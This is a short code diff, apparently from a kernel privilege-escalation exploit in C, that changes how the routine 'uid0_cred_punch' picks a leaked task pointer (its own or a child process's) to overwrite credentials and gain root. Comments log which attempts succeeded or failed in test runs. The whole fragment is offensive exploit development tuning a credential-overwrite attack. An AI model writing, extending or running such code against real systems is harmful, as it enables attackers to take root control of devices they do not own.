@@ -2144,17 +2144,24 @@ uid0_cred_punch:;
   int ucnt = 0;
   uintptr_t use_task = 0;
   const char *who = "none";
-  /* Prefer self so getuid() is in-process. Child real_cred is reporting
-   * root only (wedged, cred still 2000). Watchers muted just above. */
-  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
+  /* Z29 rule (reconfirmed 08-30): self punches only land when the leaked
+   * x28 is already in the P0 window (ffffff80…). High-alias self x28
+   * (ffffff87/88/89) self-punches missed 3/3 today (CapEff stayed 0);
+   * the child punch hit (overnight 26225: child_status=0). Self only if
+   * P0; else child raw (high alias is fine for the child). */
+  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4 &&
+      p0_dram_ptr(lself.x28)) {
     use_task = lself.x28;
     ucnt = lself.x28_cnt;
-    who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
-  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4 &&
-             lch.x28 != lself.x28) {
+    who = "self_x28_p0";
+  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
     use_task = lch.x28;
     ucnt = lch.x28_cnt;
     who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
+  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
+    use_task = lself.x28;
+    ucnt = lself.x28_cnt;
+    who = "self_x28";
   }
 
   {
